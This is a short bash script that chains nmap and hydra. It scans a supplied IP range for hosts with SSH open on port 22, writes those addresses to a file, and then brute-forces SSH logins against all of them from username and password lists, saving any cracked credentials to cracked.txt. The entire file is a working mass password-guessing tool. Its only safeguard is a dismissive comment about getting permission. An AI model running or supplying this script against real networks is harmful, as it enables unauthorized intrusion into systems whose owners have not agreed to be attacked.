#!/bin/bash

# requires nmap and hydra installed; users.txt and passwords.txt in the same working directory.
# don't use without express permission of system owner etc. etc.

iprange=$1
hydra=`which hydra`
nmap=`which nmap`
echo ""
echo "Hydra installed - $hydra"
echo "nmap installed - $nmap"
echo "Scanning $iprange for open SSH"

#nmap the stuff, save to grepable file
$nmap -T 4 -p 22 -oG ssh_open.grep $iprange

#create txt file with accessible port 22
open=`grep "22/open" ssh_open.grep | grep -E -o '(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)' > open_ip.txt`

#hydra the open services, save results to file
$hydra -L users.txt -P passwords.txt -M open_ip.txt ssh -o cracked.txt

#clean up
rm ssh_open.grep hydra.restore
